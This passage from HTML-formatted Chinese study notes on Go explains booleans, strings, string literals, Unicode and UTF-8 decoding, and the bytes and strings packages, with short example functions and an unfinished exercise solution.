class=\"token char\">'a'</span> <span class=\"token operator\">&lt;=</span> c <span class=\"token operator\">&amp;&amp;</span> c <span class=\"token operator\">&lt;=</span> <span class=\"token char\">'z'</span> <span class=\"token operator\">||</span>\n    <span class=\"token char\">'A'</span> <span class=\"token operator\">&lt;=</span> c <span class=\"token operator\">&amp;&amp;</span> c <span class=\"token operator\">&lt;=</span> <span class=\"token char\">'Z'</span> <span class=\"token operator\">||</span>\n    <span class=\"token char\">'0'</span> <span class=\"token operator\">&lt;=</span> c <span class=\"token operator\">&amp;&amp;</span> c <span class=\"token operator\">&lt;=</span> <span class=\"token char\">'9'</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// ...ASCII letter or digit...</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>布尔值并不会隐式转换为数字值0或1，反之亦然。必须使用一个显式的if语句辅助转换：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> b <span class=\"token punctuation\">{</span>\n    i <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>如果需要经常做类似的转换，包装成一个函数会更方便：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// btoi returns 1 if b is true and 0 if false.</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">btoi</span><span class=\"token punctuation\">(</span>b <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> b <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token number\">1</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>数字到布尔型的逆转换则非常简单，不过为了保持对称，我们也可以包装一个函数：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// itob reports whether i is non-zero.</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">itob</span><span class=\"token punctuation\">(</span>i <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> i <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">}</span>\n</code></pre></div><h2>3.5. 字符串</h2>\n<p>一个字符串是一个不可改变的字节序列。字符串可以包含任意的数据，包括byte值0，但是通常是用来包含人类可读的文本。文本字符串通常被解释为采用UTF8编码的Unicode码点（rune）序列。</p>\n<p>内置的<strong>len函数</strong>可以返回一个字符串中的字节数目（不是rune字符数目），索引操作s[i]返回第i个字节的字节值，i必须满足0 ≤ i&lt; len(s)条件约束。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>s <span class=\"token operator\">:=</span> <span class=\"token string\">\"hello, world\"</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>     <span class=\"token comment\">// \"12\"</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"104 119\" ('h' and 'w')</span>\n</code></pre></div><p>如果试图访问超出字符串索引范围的字节将会导致panic异常：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>c := s[len(s)] // panic: index out of range\n</code></pre></div><p>第i个字节并不一定是字符串的第i个字符，因为对于非ASCII字符的UTF8编码会要两个或多个字节。我们先简单说下字符的工作方式。</p>\n<p><strong>子字符串</strong>操作s[i:j]基于原始的s字符串的第i个字节开始到第j个字节（并不包含j本身）生成一个新字符串。生成的新字符串将包含j-i个字节。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>fmt.Println(s[0:5]) // \"hello\"\n</code></pre></div><p>同样，如果索引超出字符串范围或者j小于i的话将导致panic异常。</p>\n<figure><figcaption>image-20240416134123069</figcaption></figure>\n<p>不管i还是j都可能被忽略，当它们被忽略时将采用0作为开始位置，采用len(s)作为结束的位置。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>fmt.Println(s[:5]) // \"hello\"\nfmt.Println(s[7:]) // \"world\"\nfmt.Println(s[:])  // \"hello, world\"\n</code></pre></div><p><strong>+操作符</strong>将两个字符串连接构造一个新字符串：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>fmt.Println(\"goodbye\" + s[5:]) // \"goodbye, world\"\n</code></pre></div><p>字符串可以用==和&lt;进行<strong>比较</strong>；比较通过逐个字节比较完成的，因此比较的结果是字符串自然编码的顺序。</p>\n<p><strong>字符串的值是不可变的</strong>：一个字符串包含的字节序列永远不会被改变，当然我们也可以给一个字符串变量分配一个新字符串值。可以像下面这样将一个字符串追加到另一个字符串：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>s := \"left foot\"\nt := s\ns += \", right foot\"\n</code></pre></div><p>这并不会导致原始的字符串值被改变，但是变量s将因为+=语句持有一个新的字符串值，但是t依然是包含原先的字符串值。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>fmt.Println(s) // \"left foot, right foot\"\nfmt.Println(t) // \"left foot\"\n</code></pre></div><p>因为字符串是不可修改的，因此尝试修改字符串内部数据的操作也是被禁止的：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>s[0] = 'L' // compile error: cannot assign to s[0]\n</code></pre></div><figure><figcaption>image-20240416134927313</figcaption></figure>\n<p>不变性意味着如果两个字符串共享相同的底层数据的话也是安全的，这使得复制任何长度的字符串代价是低廉的。同样，一个字符串s和对应的子字符串切片s[7:]的操作也可以安全地共享相同的内存，因此字符串切片操作代价也是低廉的。在这两种情况下都没有必要分配新的内存。 图3.4演示了一个字符串和两个子串共享相同的底层数据。</p>\n<figure><figcaption>img</figcaption></figure>\n<h3>3.5.1. 字符串面值</h3>\n<p>字符串值也可以用字符串面值方式编写，只要将一系列字节序列包含在双引号内即可：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>\"Hello, world\"\n</code></pre></div><p>因为Go语言源文件总是用UTF8编码，并且Go语言的文本字符串也以UTF8编码的方式处理，因此我们可以将Unicode码点也写到字符串面值中。</p>\n<p>在一个双引号包含的字符串面值中，可以用以反斜杠<code>\\</code>开头的转义序列插入任意的数据。下面的换行、回车和制表符等是常见的ASCII控制代码的转义方式：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>\\a      响铃\n\\b      退格\n\\f      换页\n\\n      换行\n\\r      回车\n\\t      制表符\n\\v      垂直制表符\n\\'      单引号（只用在 '\\'' 形式的rune符号面值中）\n\\\"      双引号（只用在 \"...\" 形式的字符串面值中）\n\\\\      反斜杠\n</code></pre></div><p>可以通过十六进制或八进制转义在字符串面值中包含任意的字节。</p>\n<ul>\n<li>一个十六进制的转义形式是<code>\\xhh</code>，其中两个h表示十六进制数字（大写或小写都可以）。</li>\n<li>一个八进制转义形式是<code>\\ooo</code>，包含三个八进制的o数字（0到7），但是不能超过<code>\\377</code>（译注：对应一个字节的范围，十进制为255）。</li>\n<li>每一个单一的字节表达一个特定的值。</li>\n</ul>\n<p><strong>原生字符串</strong></p>\n<ul>\n<li>一个原生的字符串面值形式是<code>...</code>，使用反引号代替双引号。</li>\n<li>在原生的字符串面值中，没有转义操作；全部的内容都是字面的意思，包含退格和换行，因此一个程序中的原生字符串面值可能跨越多行</li>\n<li>（译注：在原生字符串面值内部是无法直接写反引号字符的，可以用八进制或十六进制转义或+\"`\"连接字符串常量完成）。</li>\n<li>唯一的特殊处理是会删除回车以保证在所有平台上的值都是一样的，包括那些把回车也放入文本文件的系统（译注：Windows系统会把回车和换行一起放入文本文件中）。</li>\n</ul>\n<p>原生字符串面值用于编写正则表达式会很方便，因为正则表达式往往会包含很多反斜杠。原生字符串面值同时被广泛应用于HTML模板、JSON面值、命令行提示信息以及那些需要扩展到多行的场景。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>const GoUsage = `Go is a tool for managing Go source code.\n\nUsage:\n    go command [arguments]\n...`\n</code></pre></div><figure><figcaption>image-20240416140122874</figcaption></figure>\n<h3>3.5.2. Unicode</h3>\n<p>Unicode（ http://unicode.org ），它收集了这个世界上所有的符号系统，包括重音符号和其它变音符号，制表符和回车符，还有很多神秘的符号，每个符号都分配一个唯一的Unicode码点，在第八版本的Unicode标准里收集了超过120,000个字符，涵盖超过100多种语言。</p>\n<p>Unicode码点对应Go语言中的rune整数类型。通用的<strong>表示一个Unicode码点的数据类型是int32</strong>，也就是Go语言中rune对应的类型；它的同义词rune符文正是这个意思。</p>\n<ul>\n<li>\n<p>我们可以将一个符文序列表示为一个int32序列，这种编码方式叫UTF-32或UCS-4，这种方式比较简单统一，但是它会浪费很多存储空间</p>\n</li>\n<li>\n<p>但是，大多数计算机可读的文本是ASCII字符，本来每个ASCII字符只需要8bit或1字节就能表示。而且即使是常用的字符也远少于65,536个，也就是说用16bit编码方式就能表达常用字符。</p>\n</li>\n</ul>\n<h3>3.5.3. UTF-8</h3>\n<p>UTF8是一个将Unicode码点编码为字节序列的变长编码。UTF8编码是由Go语言之父Ken Thompson和Rob Pike共同发明的，现在已经是Unicode的标准。</p>\n<ul>\n<li>UTF8编码使用1到4个字节来表示每个Unicode码点，ASCII部分字符只使用1个字节，常用字符部分使用2或3个字节表示。</li>\n<li>每个符号编码后第一个字节的高端bit位用于表示编码总共有多少个字节。如果第一个字节的高端bit为0，则表示对应7bit的ASCII字符，ASCII字符每个字符依然是一个字节，和传统的ASCII编码兼容。</li>\n<li>如果第一个字节的高端bit是110，则说明需要2个字节；后续的每个高端bit都以10开头。更大的Unicode码点也是采用类似的策略处理。</li>\n</ul>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>0xxxxxxx                             runes 0-127    (ASCII)\n110xxxxx 10xxxxxx                    128-2047       (values &lt;128 unused)\n1110xxxx 10xxxxxx 10xxxxxx           2048-65535     (values &lt;2048 unused)\n11110xxx 10xxxxxx 10xxxxxx 10xxxxxx  65536-0x10ffff (other values unused)\n</code></pre></div><p>变长的编码无法直接通过索引来访问第n个字符，但是UTF8编码获得了很多额外的优点。</p>\n<ul>\n<li>首先UTF8编码比较紧凑，完全兼容ASCII码，并且可以自动同步：它可以通过向前回朔最多3个字节就能确定当前字符编码的开始字节的位置。</li>\n<li>它也是一个前缀编码，所以当从左向右解码时不会有任何歧义也并不需要向前查看（译注：像GBK之类的编码，如果不知道起点位置则可能会出现歧义）。</li>\n<li>没有任何字符的编码是其它字符编码的子串，或是其它编码序列的字串，因此搜索一个字符时只要搜索它的字节编码序列即可，不用担心前后的上下文会对搜索结果产生干扰。</li>\n<li>同时UTF8编码的顺序和Unicode码点的顺序一致，因此可以直接排序UTF8编码序列。</li>\n<li>因为没有嵌入的NUL(0)字节，可以很好地兼容那些使用NUL作为字符串结尾的编程语言。</li>\n</ul>\n<p>Go语言的源文件采用UTF8编码，并且Go语言处理UTF8编码的文本也很出色。</p>\n<ul>\n<li>unicode包提供了诸多处理rune字符相关功能的函数（比如区分字母和数字，或者是字母的大写和小写转换等）</li>\n<li>unicode/utf8包则提供了用于rune字符序列的UTF8编码和解码的功能。</li>\n</ul>\n<p>有很多Unicode字符很难直接从键盘输入，并且还有很多字符有着相似的结构；有一些甚至是不可见的字符。**Go语言字符串面值中的Unicode转义字符让我们可以通过Unicode码点输入特殊的字符。**有两种形式：</p>\n<ul>\n<li><code>\\uhhhh</code>对应16bit的码点值，<code>\\Uhhhhhhhh</code>对应32bit的码点值，其中h是一个十六进制数字；</li>\n<li>一般很少需要使用32bit的形式。每一个对应码点的UTF8编码。例如：下面的字母串面值都表示相同的值：</li>\n</ul>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>\"世界\"\n\"\\xe4\\xb8\\x96\\xe7\\x95\\x8c\"\n\"\\u4e16\\u754c\"\n\"\\U00004e16\\U0000754c\"\n</code></pre></div><p>上面三个转义序列都为第一个字符串提供替代写法，但是它们的值都是相同的。</p>\n<figure><figcaption>image-20240416143310476</figcaption></figure>\n<p>Unicode转义也可以使用在rune字符中。下面三个字符是等价的：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>'世' '\\u4e16' '\\U00004e16'\n</code></pre></div><figure><figcaption>image-20240416144001322</figcaption></figure>\n<p>对于小于256的码点值可以写在一个十六进制转义字节中，例如<code>\\x41</code>对应字符'A'，但是对于更大的码点则必须使用<code>\\u</code>或<code>\\U</code>转义形式。因此，<code>\\xe4\\xb8\\x96</code>并不是一个合法的rune字符，虽然这三个字节对应一个有效的UTF8编码的码点。</p>\n<figure><figcaption>image-20240416144219458</figcaption></figure>\n<p>我们可以不用解码直接测试一个字符串是否是另一个字符串的前缀：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func HasPrefix(s, prefix string) bool {\n    return len(s) &gt;= len(prefix) &amp;&amp; s[:len(prefix)] == prefix\n}\n</code></pre></div><p>或者是后缀测试：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func HasSuffix(s, suffix string) bool {\n    return len(s) &gt;= len(suffix) &amp;&amp; s[len(s)-len(suffix):] == suffix\n}\n</code></pre></div><p>或者是包含子串测试：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func Contains(s, substr string) bool {\n    for i := 0; i &lt; len(s); i++ {\n        if HasPrefix(s[i:], substr) {\n            return true\n        }\n    }\n    return false\n}\n</code></pre></div><p>对于UTF8编码后文本的处理和原始的字节处理逻辑是一样的。但是对应很多其它编码则并不是这样的。（上面的函数都来自strings字符串处理包，真实的代码包含了一个用哈希技术优化的Contains 实现。）</p>\n<figure><figcaption>image-20240416144615253</figcaption></figure>\n<p>另一方面，如果我们真的关心每个Unicode字符，我们可以使用其它处理方式。考虑前面的第一个例子中的字符串，它混合了中西两种字符。图3.5展示了它的内存表示形式。字符串包含13个字节，以UTF8形式编码，但是只对应9个Unicode字符：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>import \"unicode/utf8\"\n\ns := \"Hello, 世界\"\nfmt.Println(len(s))                    // \"13\"\nfmt.Println(utf8.RuneCountInString(s)) // \"9\"\n</code></pre></div><p>为了处理这些真实的字符，我们需要一个UTF8解码器。unicode/utf8包提供了该功能，我们可以这样使用：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>for i := 0; i &lt; len(s); {\n    r, size := utf8.DecodeRuneInString(s[i:])\n    fmt.Printf(\"%d\\t%c\\n\", i, r)\n    i += size\n}\n</code></pre></div><p>每一次调用<code>DecodeRuneInString</code>函数都返回一个<code>r</code>和长度，<code>r</code>对应字符本身，长度对应<code>r</code>采用UTF8编码后的编码字节数目。长度可以用于更新第i个字符在字符串中的字节索引位置。</p>\n<p>Go语言的range循环在处理字符串的时候，会自动隐式解码UTF8字符串。(需要注意的是对于非ASCII，索引更新的步长将超过1个字节。)</p>\n<figure><figcaption>img</figcaption></figure>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">unicode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\ts <span class=\"token operator\">:=</span> <span class=\"token string\">\"Hello, 世界\"</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"13\"</span>\n\t<span class=\"token comment\">// 方法1 直接调utf8.RuneCountInString()</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>utf8<span class=\"token punctuation\">.</span><span class=\"token function\">RuneCountInString</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"9\"</span>\n\t<span class=\"token comment\">// 方法2 range循环在处理字符串的时候，会自动隐式解码UTF8字符串</span>\n\tn <span class=\"token operator\">:=</span> <span class=\"token number\">0</span>\n\n\t<span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span> r <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> s <span class=\"token punctuation\">{</span>\n\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\t%q\\t%d\\n\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">)</span>\n\t\tn<span class=\"token operator\">++</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number of runes:\"</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>\n\t<span class=\"token comment\">// 方法3 遍历 调用utf8.DecodeRuneInString(s[i:])</span>\n\tm <span class=\"token operator\">:=</span> <span class=\"token number\">0</span>\n\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">{</span>\n\t\tr<span class=\"token punctuation\">,</span> size <span class=\"token operator\">:=</span> utf8<span class=\"token punctuation\">.</span><span class=\"token function\">DecodeRuneInString</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\t%q\\t%d\\n\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">)</span>\n\t\ti <span class=\"token operator\">+=</span> size\n\t\tm<span class=\"token operator\">++</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number of runes:\"</span><span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>每一个UTF8字符解码，不管是显式地调用<code>utf8.DecodeRuneInString</code>解码或是在<code>range</code>循环中隐式地解码，如果遇到一个错误的UTF8编码输入，将生成一个特别的Unicode字符<code>\\uFFFD</code>，在印刷中这个符号通常是一个黑色六角或钻石形状，里面包含一个白色的问号\"?\"。</p>\n<p>UTF8字符串作为交换格式是非常方便的，但是在程序内部采用rune序列可能更方便，因为rune大小一致，支持数组索引和方便切割。</p>\n<p>将[]rune类型转换应用到UTF8编码的字符串，将返回字符串编码的Unicode码点序列：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>// \"program\" in Japanese katakana\ns := \"プログラム\"\nfmt.Printf(\"% x\\n\", s) // \"e3 83 97 e3 83 ad e3 82 b0 e3 83 a9 e3 83 a0\"\nr := []rune(s)\nfmt.Printf(\"%x\\n\", r)  // \"[30d7 30ed 30b0 30e9 30e0]\"\n</code></pre></div><p>（在第一个Printf中的<code>% x</code>参数用于在每个十六进制数字前插入一个空格。）</p>\n<p>如果是将一个[]rune类型的Unicode字符slice或数组转为string，则对它们进行UTF8编码：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>fmt.Println(string(r)) // \"プログラム\"\n</code></pre></div><p>将一个整数转型为字符串意思是生成以只包含对应Unicode码点字符的UTF8字符串：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>fmt.Println(string(65))     // \"A\", not \"65\"\nfmt.Println(string(0x4eac)) // \"京\"\n</code></pre></div><p>如果对应码点的字符是无效的，则用<code>\\uFFFD</code>无效字符作为替换：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>fmt.Println(string(1234567)) // \"?\"\n</code></pre></div><figure><figcaption>image-20240416152614804</figcaption></figure>\n<h3>3.5.4. 字符串和Byte切片</h3>\n<p>标准库中有四个包对字符串处理尤为重要：bytes、strings、strconv和unicode包。</p>\n<ul>\n<li>\n<p>strings包提供了许多如字符串的查询、替换、比较、截断、拆分和合并等功能。例如ToUpper和ToLower，将原始字符串的每个字符都做相应的转换，然后返回新的字符串。</p>\n</li>\n<li>\n<p>bytes包也提供了很多类似功能的函数，但是针对和字符串有着相同结构的[]byte类型。因为字符串是只读的，因此逐步构建字符串会导致很多分配和复制。在这种情况下，使用bytes.Buffer类型将会更有效，稍后我们将展示。</p>\n</li>\n<li>\n<p>strconv包提供了布尔型、整型数、浮点数和对应字符串的相互转换，还提供了双引号转义相关的转换。</p>\n</li>\n<li>\n<p>unicode包提供了IsDigit、IsLetter、IsUpper和IsLower等类似功能，它们用于给字符分类。每个函数有一个单一的rune类型的参数，然后返回一个布尔值。而像ToUpper和ToLower之类的转换函数将用于rune字符的大小写转换。所有的这些函数都是遵循Unicode标准定义的字母、数字等分类规范。</p>\n</li>\n</ul>\n<p>下面例子的basename函数灵感源于Unix shell的同名工具。在我们实现的版本中，basename(s)将看起来像是系统路径的前缀删除，同时将看似文件类型的后缀名部分删除：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>// basename removes directory components and a .suffix.\n// e.g., a =&gt; a, a.go =&gt; a, a/b/c.go =&gt; c, a/b.c.go =&gt; b.c\npackage main\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n)\n\nfunc main() {\n\tfmt.Println(basename1(\"a\"))\n\tfmt.Println(basename1(\"a.go\"))\n\tfmt.Println(basename1(\"a/b/c.go\"))\n\tfmt.Println(basename2(\"a\"))\n\tfmt.Println(basename2(\"a.go\"))\n\tfmt.Println(basename2(\"a/b/c.go\"))\n}\n\n// NOTE: 第一个版本并没有使用任何库，全部手工硬编码实现\nfunc basename1(s string) string {\n\t// Discard last '/' and everything before.\n\tfor i := len(s) - 1; i &gt;= 0; i-- {\n\t\tif s[i] == '/' {\n\t\t\ts = s[i+1:]\n\t\t\tbreak\n\t\t}\n\t}\n\t// Preserve everything before last '.'.\n\tfor i := len(s) - 1; i &gt;= 0; i-- {\n\t\tif s[i] == '.' {\n\t\t\ts = s[:i]\n\t\t\tbreak\n\t\t}\n\t}\n\treturn s\n}\n\n// NOTE: 这个简化版本使用了strings.LastIndex库函数\nfunc basename2(s string) string {\n\tslash := strings.LastIndex(s, \"/\") // -1 if \"/\" not found\n\ts = s[slash+1:]\n\tif dot := strings.LastIndex(s, \".\"); dot &gt;= 0 {\n\t\ts = s[:dot]\n\t}\n\treturn s\n}\n\n</code></pre></div><p><strong>例2</strong></p>\n<p>将一个表示整数值的字符串，每隔三个字符插入一个逗号分隔符，例如“12345”处理后成为“12,345”。这个版本只适用于整数类型；支持浮点数类型的留作练习。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>package main\n\nimport \"fmt\"\n\nfunc main() {\n\ts := \"1234567890\"\n\tfmt.Println(comma(s))\n}\n\n// comma inserts commas in a non-negative decimal integer string.\nfunc comma(s string) string {\n\tn := len(s)\n\tif n &lt;= 3 {\n\t\treturn s\n\t}\n\treturn comma(s[:n-3]) + \",\" + s[n-3:]\n}\n\n</code></pre></div><h4>byte切片</h4>\n<p>一个字符串是包含只读字节的数组，一旦创建，是不可变的。一个字节slice的元素则可以自由地修改。字符串和字节slice之间可以相互转换：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>s := \"abc\"\nb := []byte(s)\ns2 := string(b)\n</code></pre></div><p>从概念上讲，一个[]byte(s)转换是分配了一个新的字节数组用于保存字符串数据的拷贝，然后引用这个底层的字节数组。将一个字节slice转换到字符串的string(b)操作则是构造一个字符串拷贝，以确保s2字符串是只读的。</p>\n<p>为了避免转换中不必要的内存分配，bytes包和strings同时提供了许多实用函数。下面是strings包中的六个函数：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func Contains(s, substr string) bool\nfunc Count(s, sep string) int\nfunc Fields(s string) []string\nfunc HasPrefix(s, prefix string) bool\nfunc Index(s, sep string) int\nfunc Join(a []string, sep string) string\n</code></pre></div><p>bytes包中也对应的六个函数：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func Contains(b, subslice []byte) bool\nfunc Count(s, sep []byte) int\nfunc Fields(s []byte) [][]byte\nfunc HasPrefix(s, prefix []byte) bool\nfunc Index(s, sep []byte) int\nfunc Join(s [][]byte, sep []byte) []byte\n</code></pre></div><p>它们之间唯一的区别是字符串类型参数被替换成了字节slice类型的参数。</p>\n<p>bytes包还提供了<strong>Buffer类型</strong>用于字节slice的缓存。一个Buffer开始是空的，但是随着string、byte或[]byte等类型数据的写入可以<strong>动态增长</strong>，<strong>一个bytes.Buffer变量并不需要初始化，因为零值也是有效的：</strong></p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>// intsToString is like fmt.Sprint(values) but adds commas.\nfunc intsToString(values []int) string {\n    var buf bytes.Buffer\n    buf.WriteByte('[')\n    for i, v := range values {\n        if i &gt; 0 {\n            buf.WriteString(\", \")\n        }\n        fmt.Fprintf(&amp;buf, \"%d\", v)\n    }\n    buf.WriteByte(']')\n    return buf.String()\n}\n\nfunc main() {\n    fmt.Println(intsToString([]int{1, 2, 3})) // \"[1, 2, 3]\"\n}\n</code></pre></div><p>当向<code>bytes.Buffer</code>添加任意字符的UTF8编码时，最好使用<code>bytes.Buffer</code>的<code>WriteRune</code>方法，但是<code>WriteByte</code>方法对于写入类似<code>'['</code>和<code>']'</code>等ASCII字符则会更加有效。</p>\n<h3>练习 3.10</h3>\n<p>编写一个非递归版本的comma函数，使用bytes.Buffer代替字符串链接操作。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"bytes\"</span>\n\t<span class=\"token string\">\"fmt\"</span>\n\t<span class=\"token string\">\"unicode/utf8\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\ts <span class=\"token operator\">:=</span> <span class=\"token string\">\"asd..zqwoirn1世界11099\"</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token function\">comma</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// comma inserts commas in a non-negative decimal integer string.</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">comma</span><span class=\"token punctuation\">(</span>s <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">var</span> buf bytes<span class=\"token punctuation\">.</span>Buffer\n\t<span class=\"token comment\">// NOTE: 这里直接写len不行 碰到中文就不对了</span>\n\truneCnt <span class=\"token operator\">:=</span> utf8<span class=\"token punctuation\">.</span><span class=\"token function\">RuneCountInString</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n\tsep <span class=\"token operator\">:=</span> runeCnt <span class=\"token operator\">%</span> <span class=\"token number\">3</span>\n\t<span class=\"token comment\">// NOTE: 需要定义一个cnt，然后进循环里++，要直接用range s 的index结果不对,因为每次遇到中文index加2</span>\n\tcnt <span class=\"token operator\">:=</span> <span class=\"token number\">0</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> r <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> s <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token comment\">// r is 